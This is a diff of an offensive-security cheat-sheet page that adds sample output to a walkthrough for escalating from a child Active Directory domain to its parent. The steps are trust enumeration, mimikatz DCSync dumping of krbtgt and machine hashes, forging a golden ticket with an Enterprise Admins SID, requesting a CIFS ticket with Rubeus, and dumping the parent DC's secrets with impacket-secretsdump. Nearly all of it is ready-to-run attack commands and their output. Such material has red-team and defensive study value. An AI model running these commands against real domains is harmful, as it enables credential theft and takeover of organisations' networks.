@@ -347,20 +347,161 @@ body.dark-mode #dynamicFormContainer button:hover {
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trust-relationships">1. Check trust relationships</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get all trusted domain objects in a forest
 </span></span><span class="line"><span class="cl"><span class="go">Get-ADTrust -Filter *
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; Get-ADTrust -Filter *
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Direction               : BiDirectional
+</span></span></span><span class="line"><span class="cl"><span class="go">DisallowTransivity      : False
+</span></span></span><span class="line"><span class="cl"><span class="go">DistinguishedName       : CN=example.com,CN=System,DC=corp,DC=example,DC=com
+</span></span></span><span class="line"><span class="cl"><span class="go">ForestTransitive        : False
+</span></span></span><span class="line"><span class="cl"><span class="go">IntraForest             : True
+</span></span></span><span class="line"><span class="cl"><span class="go">IsTreeParent            : False
+</span></span></span><span class="line"><span class="cl"><span class="go">IsTreeRoot              : False
+</span></span></span><span class="line"><span class="cl"><span class="go">Name                    : example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectClass             : trustedDomain
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectGUID              : b0c64079-6f51-4516-9a62-90f94666bfc1
+</span></span></span><span class="line"><span class="cl"><span class="go">SelectiveAuthentication : False
+</span></span></span><span class="line"><span class="cl"><span class="go">SIDFilteringForestAware : False
+</span></span></span><span class="line"><span class="cl"><span class="go">SIDFilteringQuarantined : False
+</span></span></span><span class="line"><span class="cl"><span class="go">Source                  : DC=corp,DC=example,DC=com
+</span></span></span><span class="line"><span class="cl"><span class="go">Target                  : example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">TGTDelegation           : False
+</span></span></span><span class="line"><span class="cl"><span class="go">TrustAttributes         : 32
+</span></span></span><span class="line"><span class="cl"><span class="go">TrustedPolicy           : 
+</span></span></span><span class="line"><span class="cl"><span class="go">TrustingPolicy          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">TrustType               : Uplevel
+</span></span></span><span class="line"><span class="cl"><span class="go">UplevelOnly             : False
+</span></span></span><span class="line"><span class="cl"><span class="go">UsesAESKeys             : False
+</span></span></span><span class="line"><span class="cl"><span class="go">UsesRC4Encryption       : False
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Returns a list of trusted domains
 </span></span><span class="line"><span class="cl"><span class="go">nltest /domain_trusts
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; nltest /domain_trusts
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">List of domain trusts:
+</span></span></span><span class="line"><span class="cl"><span class="go">    0: EXAMPLE example.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
+</span></span></span><span class="line"><span class="cl"><span class="go">    1: EXAMPLE-CORP corp.example.com (NT 5) (Forest: 0) (Primary Domain) (Native)
+</span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Gets a collection of the trust relationships of the current forest
 </span></span><span class="line"><span class="cl"><span class="go">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SourceName     TargetName   TrustType TrustDirection
+</span></span></span><span class="line"><span class="cl"><span class="go">----------     ----------   --------- --------------
+</span></span></span><span class="line"><span class="cl"><span class="go">corp.example.com example.com  ParentChild  Bidirectional
 </span></span></span></code></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get current and target domain SID</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#39;lsadump::trust&#39; &#39;exit&#39;
-</span></span></span></code></pre></div><h4 id="3-get-krbtgt-hash-of-current-domain">3. Get krbtgt hash of current domain</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#39;lsadump::dcsync /all /csv&#39; &#39;exit&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::trust&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz.exe &#39;lsadump::trust&#39; &#39;exit&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # lsadump::trust
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Current domain: CORP.EXAMPLE.COM (EXAMPLE-CORP / S-1-5-21-2034262909-2733679486-179904498)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Domain: EXAMPLE.COM (EXAMPLE / S-1-5-21-4084500788-938703357-3654145966)
+</span></span></span><span class="line"><span class="cl"><span class="go">ERROR kuhl_m_lsadump_trust ; LsaQueryTrustedDomainInfoByName c0000003
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
+</span></span></span></code></pre></div><h4 id="3-get-parent-machine-accounts-hash">3. Get parent machine account&rsquo;s hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::dcsync /all /csv&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz &#34;lsadump::dcsync /all /csv&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # lsadump::dcsync /all /csv
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;corp.example.com&#39; will be the domain
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;PRIMARY.corp.example.com&#39; will be the DC server
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] Exporting domain &#39;corp.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[rpc] Service  : ldap
+</span></span></span><span class="line"><span class="cl"><span class="go">[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span></span></span><span class="line"><span class="cl"><span class="go">502     krbtgt  7ddf32e17a6ac5ce04a8ecbf782ca509        514
+</span></span></span><span class="line"><span class="cl"><span class="go">500     Administrator   ac2b5f88fc33b7b9e0682be85784ec0d        512
+</span></span></span><span class="line"><span class="cl"><span class="go">1000    PRIMARY$        59920e994636168744039017dcf49e54        532480
+</span></span></span><span class="line"><span class="cl"><span class="go">1103    EXAMPLE$  f4de7fcd07c14a00ff96c5f900625529        2080
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></code></pre></div><h4 id="4-forge-a-golden-ticket">4. Forge a golden ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append <span class="s1">&#39;-519&#39;</span> to target domain SID <span class="o">(</span>Enterprise Admins Group<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#39;kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; /domain:&lt;CURRENT_DOMAIN&gt; /sid:&lt;CURRENT_DOMAIN_SID&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:C:\ProgramData\ticket.kirbi&#39; &#39;exit&#39;
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; /domain:&lt;CURRENT_DOMAIN&gt; /sid:&lt;CURRENT_DOMAIN_SID&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:C:\ProgramData\ticket.kirbi&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz &#34;kerberos::golden /user:Administrator /rc4:f4de7fcd07c14a00ff96c5f900625529 /domain:CORP.EXAMPLE.COM /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ticket:C:\ProgramData\ticket.kirbi&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # kerberos::golden /user:Administrator /rc4:f4de7fcd07c14a00ff96c5f900625529 /domain:CORP.EXAMPLE.COM /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ticket:C:\ProgramData\ticket.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go">User      : Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">Domain    : CORP.EXAMPLE.COM (CORP)
+</span></span></span><span class="line"><span class="cl"><span class="go">SID       : S-1-5-21-2034262909-2733679486-179904498
+</span></span></span><span class="line"><span class="cl"><span class="go">User Id   : 500
+</span></span></span><span class="line"><span class="cl"><span class="go">Groups Id : *513 512 520 518 519 
+</span></span></span><span class="line"><span class="cl"><span class="go">Extra SIDs: S-1-5-21-4084500788-938703357-3654145966-519 ; 
+</span></span></span><span class="line"><span class="cl"><span class="go">ServiceKey: 69eb46aa347a8c68edb99be2725403ab - rc4_hmac_nt      
+</span></span></span><span class="line"><span class="cl"><span class="go">Lifetime  : 9/25/2024 12:57:24 AM ; 9/23/2034 12:57:24 AM ; 9/23/2034 12:57:24 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; Ticket : C:\ProgramData\ticket.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> * PAC generated
+</span></span></span><span class="line"><span class="cl"><span class="go"> * PAC signed
+</span></span></span><span class="line"><span class="cl"><span class="go"> * EncTicketPart generated
+</span></span></span><span class="line"><span class="cl"><span class="go"> * EncTicketPart encrypted
+</span></span></span><span class="line"><span class="cl"><span class="go"> * KrbCred generated
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Final Ticket Saved to file !
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></code></pre></div><p><small><em>Note: Try different high value hashes if failed</em></small></p>
 <h4 id="5-request-a-service-ticket-of-target-domain">5. Request a service ticket of target domain</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgs /service:cifs/&lt;TARGET_DOMAIN&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EXAMPLE.COM /dc:dc01.example.com /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGS
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building TGS-REQ request for: &#39;cifs/dc01.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: dc01.example.com (10.0.0.254)
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGS request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFAjCCBP ...[SNIP]... 9zdC5odGI=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  cifs/dc01.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  EXAMPLE.COM
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  CORP.EXAMPLE.COM
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  9/25/2024 1:15:43 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  9/25/2024 11:15:43 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  10/2/2024 1:15:43 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  aes256_cts_hmac_sha1
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  +70Y7u2/llZ0AchmQrfS1eCfIhqN+g009OH5odxLG/A=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Ticket written to C:\ProgramData\ticket_2.kirbi
 </span></span></span></code></pre></div></div></p>
 <h4 id="6-secrets-dump">6. Secrets Dump</h4>
 <p>
@@ -369,10 +510,32 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-convert-kirbi-to-ccache">1. Convert kirbi to ccache</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &lt;BASE64_TICKET&gt; administrator.kirbi administrator.ccache
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &#39;&lt;BASE64_TICKET&gt;&#39; administrator.kirbi administrator.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">&#39;doIFAjCCBP ...[SNIP]... 9zdC5odGI=&#39;</span> administrator.kirbi administrator.ccache
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
+</span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
+</span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
+</span></span></span><span class="line"><span class="cl"><span class="go">              By Solomon Sklash
+</span></span></span><span class="line"><span class="cl"><span class="go">          github.com/SolomonSklash
+</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0&#39;s ticket_converter.py
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Writing decoded .kirbi file to administrator.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing converted .ccache file to administrator.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don&#39;t forget to set your environment variable: export KRB5CCNAME=administrator.ccache
 </span></span></span></code></pre></div><h4 id="2-secrets-dump">2. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=administrator.ccache
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.example.com <span class="o">&amp;&amp;</span> impacket-secretsdump administrator@dc01.example.com -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Target system bootKey: 0x994f007efc09c1eef3cb77537daf4a27
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
+</span></span></span><span class="line"><span class="cl"><span class="go">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:59920e994636168744039017dcf49e54:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-to-do">1. TO-DO</h4>
